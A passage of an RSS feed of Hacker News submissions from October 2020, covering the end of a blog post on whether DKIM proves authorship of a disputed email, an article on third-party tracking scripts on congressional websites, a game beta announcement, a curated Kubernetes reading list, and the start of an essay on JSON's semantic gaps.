<h3 id="what-we-cannot-verify">What we cannot verify</h3>
<p>Here‚Äôs the problem with this whole affair. There is absolutely no way, at all, to verify that Vadym Pozharskyi is the owner or has access to the <code><a href="https://leebriggs.co.uk/cdn-cgi/l/email-protection" data-cfemail="8ef8a0fee1f4e6effcfde5f7e7a0fbe5fcefe7e0ebcee9e3efe7e2a0ede1e3">[email&nbsp;protected]</a></code> email address. It‚Äôs possible that he is the owner. Some people reading this might even say it‚Äôs <em>likely</em> he‚Äôs the owner of that account. Information may come to light after I publish this post that it is factually correct that Vadym Pozharskyi owns this email address.</p>
<p>What I have a considerable problem with here is that Rob Graham, a well respected security researcher, is being quoted in a popular website as claiming that DKIM <em>proves</em> that Vadym Pozharskyi sent this email.</p>
<p>If you quickly scroll back to my list of reasons email isn‚Äôt secure, you‚Äôll notice that I make the assertion that anyone can register an email account with Google. In fact, I registered one in seconds:</p>
<p><img src="https://i.ibb.co/Wn7cYRh/Elj-Pm-j-Vo-AA9gl-A.jpg" alt=""></p>
<p>Again, I cannot claim that this email is <em>not</em> from Vadym Pozharskyi, but I also know that Rob Graham knows that the information being spread by the Daily Caller cannot be verified to back up the claims they‚Äôre making from a DKIM signature, and it is dishonest to claim otherwise.</p>
<h2 id="draw-your-own-conclusions">Draw your own conclusions</h2>
<p>I have a high degree of respect for Rob, despite the fact I don‚Äôt agree with his political opinions. What has begun to frustrate me more than anything about discourse in the 21st century is the tendency to provide only enough information to support your argument, and omit vital pieces of information. With that in mind, I‚Äôd like to finish this post with a couple of extra pieces of information you might consider:</p>
<ul>
<li><a href="https://noxxi.de/research/breaking-dkim-on-purpose-and-by-chance.html#spoofed_body_dhl">DKIM is not a flawless protocol</a>, and can be spoofed</li>
<li>There is <a href="https://blog.intelx.io/2020/10/14/an-osint-investigation-into-the-alleged-hunter-biden-email/">allegedly evidence</a> that a user with the email address <code><a href="https://leebriggs.co.uk/cdn-cgi/l/email-protection" data-cfemail="394f1749564351584b4a524050174c524b5850575c795e54585055175a5654">[email&nbsp;protected]</a></code> registered a DNS domain under the street address of Burisma Holdings, however I am unable to independently verify this via the means in this post.</li>
</ul>
<p>I suspect this story will continue to evolve as the election unfolds. As new information comes to light, you should draw your own conclusions - just make sure you‚Äôre drawing them with all the information at hand.</p>
</article></div>]]>
            </description>
            <link>https://leebriggs.co.uk/blog/2020/10/29/draw-your-own-conclusions.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24946813</guid>
            <pubDate>Fri, 30 Oct 2020 20:55:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Members of Congress leaking constituent data overseas]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24946745">thread link</a>) | @ianthiel
<br/>
October 30, 2020 | https://adalytics.io/blog/is-congress-leaking-your-data | <a href="https://web.archive.org/web/*/https://adalytics.io/blog/is-congress-leaking-your-data">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p>The vast majority (98.9%) of US Senators and Congressional Representatives are sending certain data points about their constituents, including potentially minors, to for-profit companies such as Google, Facebook, LiveRamp, or Oracle. They are doing this through the use of third party tracking scripts, cookies, and pixels which they have embedded on their taxpayer funded official .house.gov and .senate.gov domains. This includes notable consumer privacy advocates such as Senator Elizabeth Warren, Maria Cantwell, Ed Markey, Josh Hawley, and Ron Wyden, as well as the Senate and House leaders who are in charge of the subcommittees that focus on consumer data privacy and big tech antitrust.&nbsp;
</p><p>A handful of congressmen also have installed an impressive array of advertising and marketing tech on their .gov websites, sending data about their .gov websites‚Äô visitors to both domestic and foreign data brokers and advertising exchanges such as Avocet, OnAudience, Adobe Demdex, Eyeota, and Weborama. Several congressional websites use more than fifteen times as many third party tracking scripts as ebay.com. Multiple sites also utilize a social media feed widget that communicates with servers belonging to a company based on the outskirts of Moscow, Russia when users open their websites. One congressman even has actual Google Ads iframes embedded on his .house.gov domain.&nbsp;</p><p>A few congressmen may be utilizing their taxpayer funded .gov websites to gather data for their re-election campaigns, which may potentially be in violation of Congressional ethics rules, Federal Election Commission regulations, and Constitutional protections against unwarranted government surveillance.</p>

<ol id="table-of-contents">
	<li>
		<a href="#introduction">Introduction</a>
	</li>

	<ol>
		<li>
			<a href="#background">Background</a>
		</li>

		<li>
			<a href="#context">Context</a>
		</li>

		<li>
			<a href="#methodology">Methodology</a>
		</li>
	</ol>

	<li>
		<a href="#results">Results from scanning 537 Congressional .gov websites</a>
	</li>

	<ol>
		<li>
			<a href="#google-facebook-tools">Use of Google Analytics, Facebook Pixel, and other third party trackers</a>
		</li>
		<li>
			<a href="#third-party-cookies">Use of third party cookies</a>
		</li>
		<li>
			<a href="#third-party-tracking-scripts">Use of third party tracking scripts</a>
		</li>
	</ol>

	<li>
		<a href="#analysis">Analysis</a>
	</li>

	<ol>
		<li>
			<a href="#senate-committees">Senate antitrust &amp; consumer privacy committee members</a>
		</li>
		<li>
			<a href="#house-committees">House antitrust &amp; consumer privacy committee members</a>
		</li>
		<li>
			<a href="#data-brokers">Use of data brokers, audience management, and adtech by Congress</a>
		</li>
		<li>
			<a href="#data-sharing-foreign-companies">Sharing of browsing data with foreign companies</a>
		</li>
		<li>
			<a href="#pages-intended-for-children">Congressional web pages intended for children</a>
		</li>
		<li>
			<a href="#privacy-policies">Privacy policies</a>
		</li>
		<li>
			<a href="#google-ads-on-house-gov">Google Ads iframes loading on a congressional website</a>
		</li>
		<li>
			<a href="#privacy-respecting-members-of-congress">Privacy respecting Members of Congress</a>
		</li>
	</ol>

	<li>
		<a href="#conclusion">Conclusion</a>
	</li>

	<ol>
		<li>
			<a href="#caveats">Caveats &amp; Limitations</a>
		</li>
		<li>
			<a href="#discussion">Discussion</a>
		</li>
		<li>
			<a href="#journalists-and-legal-scholars">Possible future investigations by journalists or legal scholars</a>
		</li>
		<li>
			<a href="#take-away-points">Take away points &amp; recommendations for Congress</a>
		</li>
	</ol>
</ol><p>If you are a technically minded individual or want to jump straight into interesting findings, I recommend you go directly to the Results and Analysis sections. If you want some background on consumer privacy and how tracking tech works, this Introduction section is designed to provide some background context.</p><h2 id="background">Background</h2><p>In recent months, there have been increased calls in the US Capitol for strengthening consumer privacy protections and to evaluate the amount of influence tech giants such as Facebook and Google wield over social media, digital advertising, and news dissemination.</p><p>
These two companies command over <a href="https://www.marketwatch.com/story/as-demand-for-digital-advertising-plummets-google-and-facebook-could-have-shrinking-revenues-2020-04-28">70 percent</a> of the U.S. market share for digital ads. Google and Facebook built their sprawling billion-dollar businesses by providing a myriad of ‚Äòfree‚Äô services - social media, content feeds, search results, video, photo sharing, email, and messenger services. They also provide free software tools such as Google Analytics and Facebook Pixel, which website developers can embed within their pages to track user behavior. These consumer and business tools follow hundreds of millions of users around on the internet, placing cookies on users‚Äô browsers and tracking scripts on websites to log peoples‚Äô visits, thereby building detailed profiles of consumers based on their browsing habits and interests. These datasets can then be used to target potential consumers with targeted shoe, vacation, housing, job or political ads.</p><p>
Google and Facebook‚Äôs tracking scripts and pixels are among their most popular ‚Äòfree‚Äô software tools, and they appear on websites in every corner of the internet. Even lawmakers calling for greater privacy protections use these tools on their congressional .gov websites purportedly to ‚Äúimprove‚Äù their websites. What they may actually be doing is sending their constituents‚Äô data to Google and Facebook, thereby augmenting Google and Facebook‚Äôs virtual profiles of users.</p><p>There is no shortage of lawmakers on both sides of the aisle clamoring to crown themselves as the champions of our right to privacy online.&nbsp;
</p><p>Senator Elizabeth Warren (MA), one of the most vocal critics of Big Tech, <a href="https://www.vox.com/policy-and-politics/2019/12/3/20965463/tech-2020-candidate-policies-online-data-equifax">argues</a> that breaking up Big Tech would drive accountability into their models and give ‚Äúpeople more control over how their personal information is collected, shared, and sold.‚Äù&nbsp;</p><p>
Senator Josh Hawley (MO), a rising Republican star, teamed up with Senator Mark Warner (VA) to introduce the <a href="https://www.hawley.senate.gov/senators-warner-and-hawley-introduce-bill-force-social-media-companies-disclose-how-they-are">Do Not Track Act</a> to allow Americans to opt-out of having their data collected. Sen. Hawley explains, ‚ÄúWhen a big tech company says its product is free, consumers are the ones being sold. These 'free' products track everything we do so tech companies can sell our information to the highest bidder and use it to target us with creepy ads.‚Äù He continues, ‚ÄúTech companies do their best to hide how much consumer data is worth and to whom it is sold.‚Äù</p><p>Senator Ron Wyden (D-Ore.) put forward the Mind Your Own Business Act, which he bills&nbsp; as ‚Äúthe strongest-ever protections for Americans‚Äô private data‚Äù that ‚Äúgoes further than Europe‚Äôs General Data Protection Regulation (GDPR).‚Äù&nbsp;</p><p>
<strong>Given these lawmakers‚Äô promises to protect Americans‚Äô online privacy, I was curious how their own, taxpayer funded, .</strong><strong><em>gov</em></strong><strong> websites fare in protecting and respecting users‚Äô privacy?</strong> Do their congressional websites, paid for and maintained with taxpayer funds, hold up to their own standards?</p><p>A few months ago, while I was working on a <a href="https://adalytics.io/">chrome extension</a> to collect and analyze digital ads, I noticed many representatives‚Äô websites host dozens of 3rd party cookies and tracking scripts on their .house.gov and .senate.gov websites. This means that the moment you (or a child in your household) visits your Senator or Congressperson‚Äôs website, all sorts of information about you--your IP address, physical location, how much time you spend on the page, what browser you‚Äôre using, the dimensions of your computer monitor, your computer‚Äôs operating system, social media identifiers -- can potentially be sent over to Google, Facebook, and other third party companies.</p><h2 id="context">Context</h2><p>So how exactly do data brokers or tech companies track users across different internet domains? Here I will provide a quick background on the technical means through which tracking tools operate.</p><p>When you open a website such as example.com, your computer‚Äôs browser makes a network call over the internet to that domain‚Äôs servers, which return an initial HTML document. That document contains instructions your browser parses to show text and styling, as well as further instructions for loading images or dynamic Javascript elements.</p><p>By making that initial request to example.com, your device established a quick internet connection that allowed example.com‚Äôs servers to see a few pieces of information about your browser, including your IP address. Services such as <a href="https://ipinfo.io/">ipinfo.io</a> allow one to translate a numeric IP address into a geographic location, such as that of your house or the cafe whose WiFi you are using.&nbsp;</p><p>If a web developer installed third party javascript files on a website, this serves as an embedded instruction to make your browser fetch additional files from another domain besides the one you are currently perusing. Tracking scripts such as Google Analytics or Facebook Pixel can be loaded this way, and they then act as data sensors, transmitting additional data points back not only to example.com, but also to Google and Facebook‚Äôs servers. Certain audience management or data brokers operate on this principle - a developer installs the data broker‚Äôs Javascript on their website, and then the data broker can gather information about the website‚Äôs visitors and cross-reference with other website‚Äôs data, as well as real world data such as credit cars, public records, and real estate ownership records.&nbsp;</p><p>In addition to javascript, many trackers load tiny, transparent images referred to as <a href="https://adtechbook.clearcode.cc/user-identification/">pixels</a>. Facebook <a href="https://themarkup.org/blacklight/2020/09/22/how-we-built-a-real-time-privacy-inspector#facebook-pixel">Pixel</a> is such an image. When a website configures Facebook Pixel on its pages, that causes users‚Äô browsers to make a network call to Facebook‚Äôs servers to retrieve that tiny image. Facebook Pixel can identify a particular user‚Äôs Facebook account ID and relay that over the network. This information can then be used to target ads, including potentially <a href="https://www.americanbar.org/groups/crsj/publications/human_rights_magazine_home/voting-in-2020/political-advertising-on-social-media-platforms/">political</a> ads. Facebook Pixel can track activity even when a user is not logged into their Facebook account. Facebook‚Äôs targeted ad system ‚Äòlearns‚Äô from Pixel events as well as custom user profile lists marketers can upload to create a target audience profile.&nbsp;</p><p>When your browser fetches images, javascript, or other resources after parsing a webpage‚Äôs HTML instructions, it can also receive instructions to store short pieces of text known as ‚Äòcookies‚Äô. A first party cookie is one that is set by the domain you are currently visiting - so if you are on example.com, any cookies from example.com are first party. First party cookies can only be read by code sent from example.com.</p><p>If your browser receives instructions to store a cookie from Facebook or Youtube, those are <a href="https://ico.org.uk/for-organisations/guide-to-pecr/guidance-on-the-use-of-cookies-and-similar-technologies/what-are-cookies-and-similar-technologies/">third</a> party cookies. First party cookies are frequently used to maintain user login state or save website specific preferences. Third party cookies can serve an additional purpose, which is to allow user‚Äôs behavior and usage across different web properties to be tracked. When you navigate to a different website, those third party cookies can be used to identify you as the user that was previously on ‚Ä¶</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://adalytics.io/blog/is-congress-leaking-your-data">https://adalytics.io/blog/is-congress-leaking-your-data</a></em></p>]]>
            </description>
            <link>https://adalytics.io/blog/is-congress-leaking-your-data</link>
            <guid isPermaLink="false">hacker-news-small-sites-24946745</guid>
            <pubDate>Fri, 30 Oct 2020 20:47:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Transport Fever 2 for Mac beta now available]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24946707">thread link</a>) | @cimnine
<br/>
October 30, 2020 | https://www.transportfever2.com/beta-test-registration-for-the-mac-version-now-available/ | <a href="https://web.archive.org/web/*/https://www.transportfever2.com/beta-test-registration-for-the-mac-version-now-available/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-5233">

	<div>

		
		<!-- .entry-header -->

		<div>
			<p><span>Despite the current difficult times, we managed to be productive when it comes to the completion of our Mac version of Transport Fever 2.</span></p>
<p><span>Our developers are still arranging the last details so that the internal tests can be successfully completed. A beta version for testing will then be made available. Interested testers can apply with immediate effect.</span></p>
<p><span>We are happy to accept applications for the beta test via the &lt;<a href="https://www.transportfever2.com/about/contact/">contact form</a>&gt;. Participants will have to enter the Mac system specifications in the form. Applications are only taken into consideration if participants use a valid Mac system that meets the minimum requirements (at least macOS 10.14 and a dedicated graphics card with 2 GB of video memory). Applications will be accepted until the 11th of November, after which the participants will be announced by the end of all registrations.</span></p>
<p><span>We will inform you as soon as possible about the start of the beta testing and the official release date of the Mac version.</span></p>
<p><span>We would also like to take this opportunity to announce that further major free game updates for Transport Fever 2 are arriving next year. We would like to thank all our players and fan communities for the huge interest in our game.</span></p>
<p><span>The entire Urban Games team sends best regards, and wishes you to stay healthy!</span></p>
					</div><!-- .entry-content -->

					
		
					
		

		
	</div>

</article></div>]]>
            </description>
            <link>https://www.transportfever2.com/beta-test-registration-for-the-mac-version-now-available/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24946707</guid>
            <pubDate>Fri, 30 Oct 2020 20:43:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Symmetrical Name Monsters with Mr. Snyder]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24946534">thread link</a>) | @art1011111
<br/>
October 30, 2020 | https://video.link/w/Tipub | <a href="https://web.archive.org/web/*/https://video.link/w/Tipub">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://video.link/w/Tipub</link>
            <guid isPermaLink="false">hacker-news-small-sites-24946534</guid>
            <pubDate>Fri, 30 Oct 2020 20:24:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kubernetes: A curated list of learning material]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24946483">thread link</a>) | @sharjeelsayed
<br/>
October 30, 2020 | https://devopsunlocked.com/kubernetes-learning-material/ | <a href="https://web.archive.org/web/*/https://devopsunlocked.com/kubernetes-learning-material/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
				<div id="content">
			
	<div id="primary">
		<main id="main">
			
<article id="post-1247" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
					
			
		<div itemprop="text">
			
<figure><img loading="lazy" width="1024" height="387" src="https://i0.wp.com/devopsunlocked.com/wp-content/uploads/2020/10/Learning-Mini.jpg?resize=1024%2C387&amp;ssl=1" alt="" srcset="https://i0.wp.com/devopsunlocked.com/wp-content/uploads/2020/10/Learning-Mini.jpg?resize=1024%2C387&amp;ssl=1 1024w, https://i0.wp.com/devopsunlocked.com/wp-content/uploads/2020/10/Learning-Mini.jpg?resize=300%2C113&amp;ssl=1 300w, https://i0.wp.com/devopsunlocked.com/wp-content/uploads/2020/10/Learning-Mini.jpg?resize=768%2C290&amp;ssl=1 768w, https://i0.wp.com/devopsunlocked.com/wp-content/uploads/2020/10/Learning-Mini.jpg?w=1144&amp;ssl=1 1144w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1"></figure>



<h2>Guides, documentations, blogs, and other learning material for Kubernetes.</h2>



<p>Kubernetes is a powerful tool that allows you to orchestrate, manage, and handle containers at scale, successfully. The learning curve can be steep and the terminology can be a lot to learn. Below you‚Äôll find a comprehensive, curated list of learning material that can be used to help you get started. </p>



<h3>General Introduction</h3>







<ul><li><a href="https://medium.com/containermind/a-beginners-guide-to-kubernetes-7e8ca56420b6">A Beginner‚Äôs Guide to Kubernetes</a> ‚Äì A comprehensive introduction to Kubernetes architecture</li><li><a href="https://www.cncf.io/the-childrens-illustrated-guide-to-kubernetes/">The Illustrated Children‚Äôs Guide to Kubernetes</a> ‚Äì Graphical explanations of Kubernetes</li><li><a href="https://github.com/kelseyhightower/kubernetes-the-hard-way">Kubernetes The Hard Way</a> ‚Äì Kubernetes The Hard Way guides you through bootstrapping a highly available Kubernetes cluster with end-to-end encryption between components and RBAC authentication.</li><li><a rel="noreferrer noopener" href="https://medium.com/better-programming/understanding-kubernetes-yaml-syntax-83359d33f9c2" target="_blank">Understanding the Kubernetes YAML Syntax</a> ‚Äì Kubernetes configurations are written in YAML format. This guide teaches you the syntax, what to include, and an overall basic understanding of Kubernetes configurations.</li><li><a rel="noreferrer noopener" href="https://learnk8s.io/a/troubleshooting-kubernetes.pdf" target="_blank">Troubleshooting Kubernetes deployments</a> ‚Äì A flow chart to troubleshoot a kubernetes deployment in case of issues. </li><li><a href="https://sookocheff.com/post/kubernetes/understanding-kubernetes-networking-model/">A Guide to the Kubernetes Networking Model</a> ‚Äì A in-depth run-through of Kubernetes networking</li><li><a href="https://medium.com/faun/writing-your-first-kubernetes-operator-8f3df4453234">Writing Your First Kubernetes Operator</a> ‚Äì Learn how to build and deploy your first Kubernetes Operator using the Operator SDK.</li><li><a href="https://medium.com/faun/configuring-ha-kubernetes-cluster-on-bare-metal-servers-with-kubeadm-1-2-1e79f0f7857b">Configuring HA Kubernetes cluster on bare metal servers with kubeadm</a> ‚Äì A guide to standing up a HA Kubernetes cluster on bare metal servers using kubeadm.</li><li><a href="https://medium.com/faun/google-kubernetes-engine-explain-like-im-five-1890e550c099">Introduction to Using Google Kubernetes Engine; Explain Like I‚Äôm Five!</a> ‚Äì Learn how to create your first managed Kubernetes cluster on Google Kubernetes Engine using Terraform.</li><li><a href="https://kubernetes.io/docs/tutorials/kubernetes-basics/">Learn Kubernetes Basics</a> ‚Äì This tutorial provides a walk through of the basics of the Kubernetes cluster orchestration system.<a href="https://medium.com/containermind/a-beginners-guide-to-kubernetes-7e8ca56420b6">A Beginner‚Äôs Guide to Kubernetes</a> ‚Äì A comprehensive introduction to Kubernetes architecture</li><li><a href="https://aws.github.io/aws-eks-best-practices/">Amazon EKS Best Practices Guide for Security</a> ‚Äì This guide provides advice about protecting information, systems, and assets that are reliant on EKS while delivering business value through risk assessments and mitigation strategies.</li><li><a href="https://github.com/aws-samples/amazon-k8s-node-drainer">Amazon EKS Node Drainer</a> ‚Äì A guide to cordon and evict all ‚Äúevictable‚Äù pods from an EC2 node being terminated.</li><li><a href="https://github.com/kubernetes-sigs/multi-tenancy">Kubernetes Working Group for Multi-Tenancy</a> ‚Äì This is a working place for multi-tenancy related proposals and prototypes.</li><li><a href="https://medium.com/faun/production-grade-kubernetes-monitoring-using-prometheus-78144b835b60">Production grade Kubernetes Monitoring using Prometheus</a> ‚Äì A in-depth guide to deploy Prometheus monitoring solution.</li></ul>



<h3>Blogs, Videos, and Stories!</h3>



<p>I would highly recommend reading and watching all the links down below. If you are short for time then make the 10 most common mistakes using Kubernetes and Kubernetes at Reddit a high priority!</p>



<ul><li><a href="https://blog.pipetail.io/posts/2020-05-04-most-common-mistakes-k8s/">10 most common mistakes using Kubernetes</a> [HIGHLY RECOMMEND] ‚Äì This is a great list that dives into the common mistakes of using Kubernetes. </li><li><a href="https://openai.com/blog/scaling-kubernetes-to-2500-nodes/">Scaling Kubernetes to 2,500 Nodes</a> ‚Äì Are you scaling your Kubernetes clusters to hundreds of nodes and beyond? Read this article by OpenAI on how they tackled scaling their K8s cluster.</li><li><a href="https://youtu.be/WTbIBqNcjoQ">Kubernetes at Reddit: Tales from Production</a> ‚Äì Reddit uses Kubernetes. This YouTube videos shares their experience with handling Kubernetes and more within their organization.</li><li><a href="https://www.youtube.com/watch?v=0Omvgd7Hg1I">Life of a Packet</a> ‚Äì Networking in Kubernetes. A YouTube video by Michael Rubin at Google.</li><li><a href="https://www.youtube.com/watch?v=YjZ4AZ7hRM0">How the Department of Defense Moved to Kubernetes and Istio</a></li></ul>



<h3><a href="https://github.com/tomhuang12/awesome-k8s-resources#learnings-and-documentations"></a></h3>



<h3>Learnings and Documentations</h3>



<ul><li><a href="https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/">Kubernetes API Reference Docs</a> ‚Äì A must have bookmark for those starting to learn Kubernetes.</li><li><a href="https://devopsunlocked.com/kubernetes-kubectl-cheatsheet/" data-type="URL" data-id="https://devopsunlocked.com/kubernetes-kubectl-cheatsheet/">kubectl Cheat Sheet </a>‚Äì Check out <strong><em>our</em></strong> guide to kubectl and Kubernetes!</li><li><a href="https://www.katacoda.com/courses/kubernetes/playground">Katacoda</a> ‚Äì This is a Kubernetes playground, a safe place designed for experimenting, exploring and learning Kubernetes.</li><li><a href="https://labs.play-with-k8s.com/">Play with Kubernetes</a> ‚Äì Play with Kubernetes is a playground which allows users to run K8s clusters in a matter of seconds.</li><li><a href="https://kubernetes.io/docs/tutorials/kubernetes-basics/">Configuring Redis using a ConfigMap</a> ‚Äì A walkthrough that provides a real world example of how to configure Redis using a ConfigMap</li><li><a href="https://kubernetes.io/docs/tutorials/stateless-application/expose-external-ip-address/">Exposing an External IP Address to Access an Application in a Cluster</a> ‚Äì This guide shows how to create a Kubernetes Service object that exposes an external IP address.</li><li><a href="https://kubernetes.io/docs/tutorials/stateless-application/guestbook/">Example: Deploying PHP Guestbook application with Redis</a> ‚Äì This tutorial shows you how to build and deploy a simple, multi-tier web application using Kubernetes and Docker.</li><li><a href="https://kubernetes.io/docs/tutorials/stateful-application/basic-stateful-set/">StatefulSet Basics</a> ‚Äì This tutorial provides an introduction to managing applications with StatefulSets.</li><li><a href="https://kubernetes.io/docs/tutorials/stateful-application/mysql-wordpress-persistent-volume/">Example: Deploying WordPress and MySQL with Persistent Volumes</a> ‚Äì This tutorial shows you how to deploy a WordPress site and a MySQL database using Minikube.</li><li><a href="https://kubernetes.io/docs/tutorials/stateful-application/cassandra/">Example: Deploying Cassandra with a StatefulSet</a> ‚Äì This tutorial shows you how to run Apache Cassandra on Kubernetes. Cassandra, a database, needs persistent storage to provide data durability.</li><li><a href="https://kubernetes.io/docs/tutorials/stateful-application/zookeeper/">Running ZooKeeper, A Distributed System Coordinator</a> ‚Äì This tutorial demonstrates running Apache Zookeeper on Kubernetes using StatefulSets, PodDisruptionBudgets, and PodAntiAffinity.</li><li><a href="https://www.linux.com/audience/enterprise/set-cicd-pipeline-kubernetes-part-1-overview/">Set Up a CI/CD Pipeline with Kubernetes</a> ‚Äì A end-to-end guide to set up a CI/CD Pipeline with Kubernetes.</li><li><a href="https://medium.com/faun/how-to-pass-certified-kubernetes-administrator-cka-exam-on-first-attempt-36c0ceb4c9e">How to pass the Certified Kubernetes Administrator (CKA) exam on the first attempt</a> ‚Äì A guide to pass CKA exam</li><li><a href="https://medium.com/flant-com/kubectl-commands-and-tips-7b33de0c5476">Ready-to-use commands and tips for kubectl</a></li><li><a href="https://github.com/ijelliti/CKSS-Certified-Kubernetes-Security-Specialist">Certified Kubernetes Security Specialist ‚Äì CKSS</a> ‚Äì This repository is a collection of resources to prepare for the Certified Kubernetes Security Specialist (CKSS) exam.</li><li><a rel="noreferrer noopener" href="https://www.udemy.com/course/learn-devops-the-complete-kubernetes-course/" target="_blank">[PAID] Learn DevOps: The Complete Kubernetes Course on Udemy</a> ‚Äì This is a personal favorite of mine and I learned a lot from following Edward‚Äôs course. I highly recommend this for anyone who is just starting in Kubernetes.</li></ul>



<p>I‚Äôll be updating this list as I come across new material, articles, and videos. If you have any recommendations please list them in the comment section or tweet me, <a rel="noreferrer noopener" href="https://twitter.com/aarongxa" data-type="URL" data-id="https://twitter.com/aarongxa" target="_blank">@AARONGXA</a>. </p>



<p>Also, if you wanna support me feel free to‚Ä¶</p>



<p><a href="https://www.buymeacoffee.com/aarongxa" target="_blank" rel="noopener noreferrer"><img src="https://i2.wp.com/cdn.buymeacoffee.com/buttons/v2/default-blue.png?w=1024&amp;ssl=1" alt="Buy Me A Coffee" data-recalc-dims="1"></a></p><p>üíô</p>
		</div>

				
		<div>
		
	<p><img alt="" src="https://secure.gravatar.com/avatar/?s=96&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/?s=192&amp;d=mm&amp;r=g 2x" height="96" width="96" loading="lazy"></p>
 
        
	
				<div>
	
        <p>Yo! I'm Aaron Griffith and I run devopsunlocked.com</p>
 
        
 
    </div>
 
</div>	</div>
</article>

			

					</main>
	</div>

	
	</div>
</div></div>]]>
            </description>
            <link>https://devopsunlocked.com/kubernetes-learning-material/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24946483</guid>
            <pubDate>Fri, 30 Oct 2020 20:20:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Not Just Use JSON?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24946268">thread link</a>) | @tonyg
<br/>
October 30, 2020 | https://preserves.gitlab.io/preserves/why-not-json.html | <a href="https://web.archive.org/web/*/https://preserves.gitlab.io/preserves/why-not-json.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  
<p>Tony Garnock-Jones <a href="mailto:tonyg@leastfixedpoint.com">tonyg@leastfixedpoint.com</a><br>
September 2018.</p>

<!-- JSON lacks semantics: JSON syntax doesn't denote anything -->

<p>JSON offers <em>syntax</em> for numbers, strings, booleans, null, arrays and
string-keyed maps. However, it suffers from two major problems. First,
it offers no <em>semantics</em> for the syntax: it is left to each
implementation to determine how to treat each JSON term. This causes
<a href="http://seriot.ch/parsing_json.php">interoperability</a> and even
<a href="http://web.archive.org/web/20180906202559/http://docs.couchdb.org/en/stable/cve/2017-12635.html">security</a>
issues. Second, JSON‚Äôs lack of support for type tags leads to awkward
and incompatible <em>encodings</em> of type information in terms of the fixed
suite of constructors on offer.</p>

<p>There are other minor problems with JSON having to do with its syntax.
Examples include its relative verbosity and its lack of support for
binary data.</p>

<h2 id="json-syntax-doesnt-mean-anything">JSON syntax doesn‚Äôt <em>mean</em> anything</h2>

<p>When are two JSON values the same? When are they different?
<!-- When is one JSON value ‚Äúless than‚Äù another? --></p>

<p>The specifications are largely silent on these questions. Different
JSON implementations give different answers.</p>

<p>Specifically, JSON does not:</p>

<ul>
  <li>assign any meaning to numbers,<sup id="fnref:meaning-ieee-double"><a href="#fn:meaning-ieee-double">1</a></sup></li>
  <li>determine how strings are to be compared,<sup id="fnref:string-key-comparison"><a href="#fn:string-key-comparison">2</a></sup></li>
  <li>determine whether object key ordering is significant,<sup id="fnref:json-member-ordering"><a href="#fn:json-member-ordering">3</a></sup> or</li>
  <li>determine whether duplicate object keys are permitted, what it
would mean if they were, or how to determine a duplicate in the
first place.<sup id="fnref:json-key-uniqueness"><a href="#fn:json-key-uniqueness">4</a></sup></li>
</ul>

<p>In short, JSON syntax doesn‚Äôt <em>denote</em> anything.<sup id="fnref:xml-infoset"><a href="#fn:xml-infoset">5</a></sup> <sup id="fnref:other-formats"><a href="#fn:other-formats">6</a></sup></p>

<p>Some examples:</p>

<ul>
  <li>are the JSON values <code>1</code>, <code>1.0</code>, and <code>1e0</code> the same or different?</li>
  <li>are the JSON values <code>1.0</code> and <code>1.0000000000000001</code> the same or different?</li>
  <li>are the JSON strings <code>"p√§ron"</code> (UTF-8 <code>70c3a4726f6e</code>) and <code>"paÃàron"</code>
(UTF-8 <code>7061cc88726f6e</code>) the same or different?</li>
  <li>are the JSON objects <code>{"a":1, "b":2}</code> and <code>{"b":2, "a":1}</code> the same
or different?</li>
  <li>which, if any, of <code>{"a":1, "a":2}</code>, <code>{"a":1}</code> and <code>{"a":2}</code> are the
same? Are all three legal?</li>
  <li>are <code>{"p√§ron":1}</code> and <code>{"paÃàron":1}</code> the same or different?</li>
</ul>

<h2 id="json-can-multiply-nicely-but-it-cant-add-very-well">JSON can multiply nicely, but it can‚Äôt add very well</h2>

<p>JSON includes a fixed set of types: numbers, strings, booleans, null,
arrays and string-keyed maps. Domain-specific data must be <em>encoded</em>
into these types. For example, dates and email addresses are often
represented as strings with an implicit internal structure.</p>

<p>There is no convention for <em>labelling</em> a value as belonging to a
particular category. Instead, JSON-encoded data are often labelled in
an ad-hoc way. Multiple incompatible approaches exist. For example, a
‚Äúmoney‚Äù structure containing a <code>currency</code> field and an <code>amount</code> may be
represented in any number of ways:</p>

<div><div><pre><code>{ "_type": "money", "currency": "EUR", "amount": 10 }
{ "type": "money", "value": { "currency": "EUR", "amount": 10 } }
[ "money", { "currency": "EUR", "amount": 10 } ]
{ "@money": { "currency": "EUR", "amount": 10 } }
</code></pre></div></div>

<p>This causes particular problems when JSON is used to represent <em>sum</em>
or <em>union</em> types, such as ‚Äúeither a value or an error, but not both‚Äù.
Again, multiple incompatible approaches exist.</p>

<p>For example, imagine an API for depositing money in an account. The
response might be either a ‚Äúsuccess‚Äù response indicating the new
balance, or one of a set of possible errors.</p>

<p>Sometimes, a <em>pair</em> of values is used, with <code>null</code> marking the option
